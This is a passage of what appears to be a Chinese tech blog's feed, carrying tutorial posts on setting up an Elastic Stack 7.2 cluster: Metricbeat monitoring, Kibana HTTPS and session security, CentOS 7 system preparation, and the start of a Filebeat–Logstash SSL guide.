elastic-stack-ca.p12 --name es-node2 --ip 10.20.0.12 --pem</span><br><span class="line">./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name es-node3 --ip 10.20.0.13 --pem</span><br></pre></td></tr></table></figure></li></ol><p>执行以上命令，将输出结果分别保存为es-node1.zip es-node2.zip es-node3.zip<br>将压缩包解压后的证书文件，分别部署到每个主机节点上Metricbeat下的certs子目录中，文件属主elastic.elastic，访问权限600<br>因为我们使用的是自签CA证书，所以还需要把CA证书公钥文件cacert.pem，同样在certs目录中放一份</p><ol start="4"><li>编辑modules.d/elasticsearch-xpack.yml文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">- module: elasticsearch</span><br><span class="line">  metricsets:</span><br><span class="line">    - ccr</span><br><span class="line">    - cluster_stats</span><br><span class="line">    - index</span><br><span class="line">    - index_recovery</span><br><span class="line">    - index_summary</span><br><span class="line">    - ml_job</span><br><span class="line">    - node_stats</span><br><span class="line">    - shard</span><br><span class="line">  period: 10s</span><br><span class="line">  hosts: [&quot;https://10.20.0.11:9200&quot;]</span><br><span class="line">  username: &quot;remote_monitoring_user&quot;</span><br><span class="line">  password: &quot;remote_monitoring_user123&quot;</span><br><span class="line">  ssl.certificate_authorities: [&quot;certs/cacert.pem&quot;]</span><br><span class="line">  ssl.certificate: &quot;certs/es-node1.crt&quot;</span><br><span class="line">  ssl.key: &quot;certs/es-node1.key&quot;</span><br><span class="line">  xpack.enabled: true</span><br></pre></td></tr></table></figure></li></ol><p>这里使用了一个es提供的内建管理账号remote_monitoring_user</p><ol start="5"><li>编辑metricbeat.yml文件<br>在节点1上面：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setup.kibana:</span><br><span class="line">  host: &quot;https://es-node1:5601&quot;</span><br><span class="line">  username: &quot;metricbeat_internal&quot;</span><br><span class="line">  password: &quot;$&#123;ES_PWD&#125;&quot;</span><br><span class="line"></span><br><span class="line">output.elasticsearch:</span><br><span class="line">  hosts: [&quot;10.20.0.11:9200&quot;]</span><br><span class="line">  protocol: &quot;https&quot;</span><br><span class="line">  ssl.certificate_authorities: [&quot;certs/cacert.pem&quot;]</span><br><span class="line">  username: &quot;metricbeat_internal&quot;</span><br><span class="line">  password: &quot;$&#123;ES_PWD&#125;&quot;</span><br><span class="line">  ssl.certificate: &quot;certs/es-node1.crt&quot;</span><br><span class="line">  ssl.key: &quot;certs/es-node1.key&quot;</span><br></pre></td></tr></table></figure></li></ol><p>在这里我们使用前面章节中创建的账号metricbeat_internal同时作为metricbeat访问kibana和elasticsearch时的授权账号；<br>需要注意的是，在启用了es安全特性后，metricbeat采集和向es索引写入监控指标数据时需要拥有适当的角色授权，请使用elastic账号登录kibana并为metricbeat_internal用户增加remote_monitoring_collector、remote_monitoring_agent两个角色的授权。<br>参照上面的说明，对节点2和节点3上的Metricbeat配置文件metricbeat.yml进行修改，注意要引用本节点的密钥文件名。</p><ol start="6"><li>启动Metricbeat服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metricbeat -e</span><br></pre></td></tr></table></figure></li></ol><p>确认日志输出中没有需要引起注意的warning或error信息</p><ol start="7"><li>登录kibana并查看Stack Monitor页面，如果能正常看到以下内容则表示监控数据采集和展示是正确的<br><img src="https://img-blog.csdnimg.cn/20190716174016431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhdGVybWVsb25iaWc=,size_16,color_FFFFFF,t_70" alt></li></ol><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;我们使用Metricbeat采集es主机节点的系统监控指标数据，以及监控es集群中索引等服务。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;对每个es服务节点编辑elasticsearch.yml，以启用监控数据采集&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;xpack.monitoring.collection.enabled: true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;在每个节点的metricbeat部署目录下，启用elasticsearch-xpack模块&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./metricbeat modules enable elasticsearch-xpack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;&lt;/ol&gt;
    
    </summary>
    
      <category term="elk" scheme="https://yongnights.github.io/categories/elk/"/>
    
    
      <category term="elk" scheme="https://yongnights.github.io/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>elastic stack 7.2技术栈【六】启用Kibana中的安全性配置</title>
    <link href="https://yongnights.github.io/2019/12/31/elastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E5%85%AD%E3%80%91%E2%80%94%E2%80%94%E5%90%AF%E7%94%A8Kibana%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%85%8D%E7%BD%AE/"/>
    <id>https://yongnights.github.io/2019/12/31/elastic stack 7.2技术栈【六】——启用Kibana中的安全性配置/</id>
    <published>2019-12-31T06:51:26.160Z</published>
    <updated>2019-12-31T06:59:20.441Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --><p>本章节主要包括配置kibana的会话安全和加密通信两项内容。</p><h2 id="配置xpack-security-encryptionKey属性"><a href="#配置xpack-security-encryptionKey属性" class="headerlink" title="配置xpack.security.encryptionKey属性"></a>配置xpack.security.encryptionKey属性</h2><p>用于加密cookie中的凭据的任意字符串，长度不超过32个字符。 至关重要的是，这个密钥不会暴露给Kibana的用户。 默认情况下，会在内存中自动生成一个值。 如果使用该默认行为，则在Kibana重新启动时，所有会话都将失效。</p><p>设置会话超时时间为30min。</p><p>在kibana.yml配置文件中：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xpack.security.encryptionKey: &quot;something_at_least_32_characters&quot;</span><br><span class="line">xpack.security.sessionTimeout: 1800000</span><br></pre></td></tr></table></figure><p></p><p>配置kibana使用https访问es服务<br>在节点1上es家目录下，为kibana服务制作数字证书：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name es-node1 --ip 10.20.0.11 --pem</span><br></pre></td></tr></table></figure><p></p><p>将得到的证书文件存放到kibana部署路径的配置文件目录下certs子目录中：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[elastic@es-node1 certs]$ pwd</span><br><span class="line">/opt/kibana-7.2.0-linux-x86_64/config/certs</span><br><span class="line">[elastic@es-node1 certs]$ ls</span><br><span class="line">es-node1.crt  es-node1.key</span><br></pre></td></tr></table></figure><p></p><a id="more"></a><h2 id="在kibana-yml文件中为kibana配置ssl的相关参数"><a href="#在kibana-yml文件中为kibana配置ssl的相关参数" class="headerlink" title="在kibana.yml文件中为kibana配置ssl的相关参数"></a>在kibana.yml文件中为kibana配置ssl的相关参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server.ssl.enabled: true</span><br><span class="line">server.ssl.key: config/certs/es-node1.key</span><br><span class="line">server.ssl.certificate: config/certs/es-node1.crt</span><br></pre></td></tr></table></figure><p>此时，启动kibana服务，验证通过 <a href="https://10.20.0.11:5601" target="_blank" rel="noopener">https://10.20.0.11:5601</a> 是否可以成功访问网站。<br>至此，我们在访问kibana服务时已经实现的加密通信。接下来，继续将kibana访问elasticsearch服务的过程切换到https加密通信。</p><h2 id="配置kibana通过https访问elasticsearch"><a href="#配置kibana通过https访问elasticsearch" class="headerlink" title="配置kibana通过https访问elasticsearch"></a>配置kibana通过https访问elasticsearch</h2><p>因为我们使用的是自签名证书，所以需要为kibana提供ca证书。<br>我们先在节点1上，将pkcs12格式的ca证书转换为kibana适用的pem格式，其中cacert.pem是证书公钥文件。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -nocerts -nodes -in elastic-stack-ca.p12 -out private.pem</span><br><span class="line">openssl pkcs12 -clcerts -nokeys -in elastic-stack-ca.p12 -out cacert.pem</span><br></pre></td></tr></table></figure><p></p><p>在kibana.yml文件中配置elasticsearch.hosts参数，并指定ca证书文件位置：：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch.hosts: [&quot;https://10.20.0.11:9200&quot;]</span><br><span class="line">elasticsearch.ssl.certificateAuthorities: [ &quot;config/certs/cacert.pem&quot; ]</span><br></pre></td></tr></table></figure><p></p><p>将Kibana配置为通过HTTPS连接到Elasticsearch监控集群，在这里我们使用的是同一个es集群：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xpack.monitoring.elasticsearch.hosts: [&quot;https://10.20.0.11:9200&quot;]</span><br><span class="line">xpack.monitoring.elasticsearch.ssl.certificateAuthorities: config/certs/cacert.pem</span><br></pre></td></tr></table></figure><p></p><p>配置三个节点上的elasticsearch服务，在elasticsearch.yml文件中补充以下http.ssl服务使用的配置参数：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xpack.security.http.ssl.enabled: true</span><br><span class="line">xpack.security.http.ssl.keystore.path: certs/$&#123;node.name&#125;.p12</span><br><span class="line">xpack.security.http.ssl.truststore.path: certs/$&#123;node.name&#125;.p12</span><br></pre></td></tr></table></figure><p></p><p>将http.ssl访问证书时使用的密码信息存储在密钥库中：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin/elasticsearch-keystore add xpack.security.http.ssl.keystore.secure_password</span><br><span class="line">bin/elasticsearch-keystore add xpack.security.http.ssl.truststore.secure_password</span><br></pre></td></tr></table></figure><p></p><p>在前面章节中我们为节点证书设置的密码是：es-node123<br>三个es节点上均需要设置<br>重启服务进程并验证配置结果<br>重启三节点上的es服务进程：bin/elasticsearch<br>重启节点1上的kibana服务进程：bin/kibana<br>看到下面这样的日志输出时，可以确认配置成功了：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log   [18:46:19.967] [info][listening] Server running at https://es-node1:5601</span><br><span class="line">log   [18:46:19.997] [info][status][plugin:spaces@7.2.0] Status changed from yellow to green - Read</span><br></pre></td></tr></table></figure><p></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;本章节主要包括配置kibana的会话安全和加密通信两项内容。&lt;/p&gt;&lt;h2 id=&quot;配置xpack-security-encryptionKey属性&quot;&gt;&lt;a href=&quot;#配置xpack-security-encryptionKey属性&quot; class=&quot;headerlink&quot; title=&quot;配置xpack.security.encryptionKey属性&quot;&gt;&lt;/a&gt;配置xpack.security.encryptionKey属性&lt;/h2&gt;&lt;p&gt;用于加密cookie中的凭据的任意字符串，长度不超过32个字符。 至关重要的是，这个密钥不会暴露给Kibana的用户。 默认情况下，会在内存中自动生成一个值。 如果使用该默认行为，则在Kibana重新启动时，所有会话都将失效。&lt;/p&gt;&lt;p&gt;设置会话超时时间为30min。&lt;/p&gt;&lt;p&gt;在kibana.yml配置文件中：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;xpack.security.encryptionKey: &amp;quot;something_at_least_32_characters&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xpack.security.sessionTimeout: 1800000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;配置kibana使用https访问es服务&lt;br&gt;在节点1上es家目录下，为kibana服务制作数字证书：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name es-node1 --ip 10.20.0.11 --pem&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;将得到的证书文件存放到kibana部署路径的配置文件目录下certs子目录中：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[elastic@es-node1 certs]$ pwd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/opt/kibana-7.2.0-linux-x86_64/config/certs&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[elastic@es-node1 certs]$ ls&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;es-node1.crt  es-node1.key&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="elk" scheme="https://yongnights.github.io/categories/elk/"/>
    
    
      <category term="elk" scheme="https://yongnights.github.io/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>elastic stack 7.2技术栈【二】操作系统的初始化配置</title>
    <link href="https://yongnights.github.io/2019/12/31/elastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%BA%8C%E3%80%91%E2%80%94%E2%80%94%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE/"/>
    <id>https://yongnights.github.io/2019/12/31/elastic stack 7.2技术栈【二】—— 操作系统的初始化配置/</id>
    <published>2019-12-31T06:51:26.158Z</published>
    <updated>2019-12-31T06:58:52.660Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --><p>操作系统使用centos7 minimual版本。elasticsearch技术栈均采用 7.2版本，默认使用basic许可，可免费使用xpack部分安全管理服务。</p><h2 id="部署使用的主机资源规划"><a href="#部署使用的主机资源规划" class="headerlink" title="部署使用的主机资源规划"></a>部署使用的主机资源规划</h2><p>使用3个主机节点</p><ul><li>10.20.0.11 es-node1</li><li>10.20.0.12 es-node2</li><li><p>10.20.0.13 es-node3</p><h2 id="升级至最新的系统小版本"><a href="#升级至最新的系统小版本" class="headerlink" title="升级至最新的系统小版本"></a>升级至最新的系统小版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y update &amp;&amp; hostnamectl set-hostname es-node1</span><br></pre></td></tr></table></figure></li><li><p>在设置节点2，节点3时请注意变更为正确的主机名</p><h2 id="禁用swap"><a href="#禁用swap" class="headerlink" title="禁用swap"></a>禁用swap</h2><p>因为es是在jvm中运行的，在内存使用上涉及不到使用swap。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swapoff -a</span><br><span class="line">sed -i &apos;/swap/d&apos; /etc/fstab</span><br></pre></td></tr></table></figure></li></ul><h2 id="系统可用资源限制"><a href="#系统可用资源限制" class="headerlink" title="系统可用资源限制"></a>系统可用资源限制</h2><p>文件句柄与最大线程并发数量：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt;&gt;  /etc/security/limits.conf</span><br><span class="line">*               soft    nofile           65535</span><br><span class="line">*               hard    nofile           65535</span><br><span class="line">*               soft    nproc           4096</span><br><span class="line">*               hard    nproc           4096</span><br><span class="line">*               soft    memlock         unlimited</span><br><span class="line">*               hard    memlock         unlimited</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p></p><a id="more"></a><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>Elasticsearch uses a mmapfs directory by default to store its indices.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt;&gt; /etc/sysctl.conf</span><br><span class="line">vm.max_map_count=262144</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><p></p><p>MMap FS类型通过将文件映射到内存（mmap）来将分片索引存储在文件系统上（映射到Lucene MMapDirectory）。 内存映射使用进程中虚拟内存地址空间的一部分等于要映射的文件的大小。 在使用此类之前，请确保您已经拥有足够的虚拟地址空间。</p><h2 id="创建es专用的系统用户"><a href="#创建es专用的系统用户" class="headerlink" title="创建es专用的系统用户"></a>创建es专用的系统用户</h2><p><code>useradd elastic</code></p><h2 id="配置firewalld防火墙规则"><a href="#配置firewalld防火墙规则" class="headerlink" title="配置firewalld防火墙规则"></a>配置firewalld防火墙规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --permanent --add-rich-rule=&quot;rule family=&apos;ipv4&apos; source address=&apos;10.20.0.0/24&apos; accept&quot;</span><br><span class="line">firewall-cmd --reload</span><br><span class="line">firewall-cmd --list-all</span><br></pre></td></tr></table></figure><h2 id="关闭selinux"><a href="#关闭selinux" class="headerlink" title="关闭selinux"></a>关闭selinux</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">sed -i &apos;/SELINUX/s/enforcing/disabled/&apos; /etc/selinux/config</span><br></pre></td></tr></table></figure><h2 id="配置-etc-hosts"><a href="#配置-etc-hosts" class="headerlink" title="配置/etc/hosts"></a>配置/etc/hosts</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt;&gt; /etc/hosts</span><br><span class="line">10.20.0.11  es-node1</span><br><span class="line">10.20.0.12  es-node2</span><br><span class="line">10.20.0.13  es-node3</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>重启系统验证各项配置生效后，继续本系列文章的下面章节的配置。</p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;操作系统使用centos7 minimual版本。elasticsearch技术栈均采用 7.2版本，默认使用basic许可，可免费使用xpack部分安全管理服务。&lt;/p&gt;&lt;h2 id=&quot;部署使用的主机资源规划&quot;&gt;&lt;a href=&quot;#部署使用的主机资源规划&quot; class=&quot;headerlink&quot; title=&quot;部署使用的主机资源规划&quot;&gt;&lt;/a&gt;部署使用的主机资源规划&lt;/h2&gt;&lt;p&gt;使用3个主机节点&lt;/p&gt;&lt;ul&gt;&lt;li&gt;10.20.0.11 es-node1&lt;/li&gt;&lt;li&gt;10.20.0.12 es-node2&lt;/li&gt;&lt;li&gt;&lt;p&gt;10.20.0.13 es-node3&lt;/p&gt;&lt;h2 id=&quot;升级至最新的系统小版本&quot;&gt;&lt;a href=&quot;#升级至最新的系统小版本&quot; class=&quot;headerlink&quot; title=&quot;升级至最新的系统小版本&quot;&gt;&lt;/a&gt;升级至最新的系统小版本&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum -y update &amp;amp;&amp;amp; hostnamectl set-hostname es-node1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;在设置节点2，节点3时请注意变更为正确的主机名&lt;/p&gt;&lt;h2 id=&quot;禁用swap&quot;&gt;&lt;a href=&quot;#禁用swap&quot; class=&quot;headerlink&quot; title=&quot;禁用swap&quot;&gt;&lt;/a&gt;禁用swap&lt;/h2&gt;&lt;p&gt;因为es是在jvm中运行的，在内存使用上涉及不到使用swap。&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;swapoff -a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &amp;apos;/swap/d&amp;apos; /etc/fstab&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;系统可用资源限制&quot;&gt;&lt;a href=&quot;#系统可用资源限制&quot; class=&quot;headerlink&quot; title=&quot;系统可用资源限制&quot;&gt;&lt;/a&gt;系统可用资源限制&lt;/h2&gt;&lt;p&gt;文件句柄与最大线程并发数量：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat &amp;lt;&amp;lt; EOF &amp;gt;&amp;gt;  /etc/security/limits.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*               soft    nofile           65535&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*               hard    nofile           65535&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*               soft    nproc           4096&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*               hard    nproc           4096&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*               soft    memlock         unlimited&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*               hard    memlock         unlimited&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="elk" scheme="https://yongnights.github.io/categories/elk/"/>
    
    
      <category term="elk" scheme="https://yongnights.github.io/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>elastic stack 7.2技术栈【八】Filebeat与Logstash两个工具之间怎样配置SSL加密通信</title>
    <link href="https://yongnights.github.io/2019/12/31/elastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E5%85%AB%E3%80%91%E2%80%94%E2%80%94%20Filebeat%E4%B8%8ELogstash%E4%B8%A4%E4%B8%AA%E5%B7%A5%E5%85%B7%E4%B9%8B%E9%97%B4%E6%80%8E%E6%A0%B7%E9%85%8D%E7%BD%AESSL%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/"/>
    <id>https://yongnights.github.io/2019/12/31/elastic stack 7.2技术栈【八】—— Filebeat与Logstash两个工具之间怎样配置SSL加密通信/</id>
    <published>2019-12-31T06:51:26.154Z</published>
    <updated>2019-12-31T06:59:12.979Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --><p>在目前比较流行的技术实践方案里，Filebeat大多用作日志采集工具，虽然它可以直接将数据写入Elasticsearch中，但出于各方面的效率考虑，一般都会通过Logstash做一个日志数据的汇聚、转换和分发处理。<br>为了保证应用日志数据的传输安全，我们可以使用SSL相互身份验证来保护Filebeat和Logstash之间的连接。 这可以确保Filebeat仅将加密数据发送到受信任的Logstash服务器，并确保Logstash服务器仅从受信任的Filebeat客户端接收数据。<br>下面就讲述一下配置Filebeat与Logstash之间进行加密通信的方法。全文是在CentOS7上基于Elastic 7.2技术栈所验证的。</p><p>我们需要一个自签的CA证书，以及使用该CA证书签署的两份数据证书。一份是给Logstash作为server端验证自己身份时使用，一份是提供给Filebeat客户端验证自己身份使用。</p><p>在这里，我们是直接利用的Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil来制作需要的证书。如果您需要对该工具做更多的了解，参考官网的这个资料：elasticsearch-certutil</p><h2 id="制作自签的CA证书"><a href="#制作自签的CA证书" class="headerlink" title="制作自签的CA证书"></a>制作自签的CA证书</h2><p>在Linux下，进入到Elasticsearch程序的部署家目录中，执行以下命令可以生成一份自签的CA证书：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 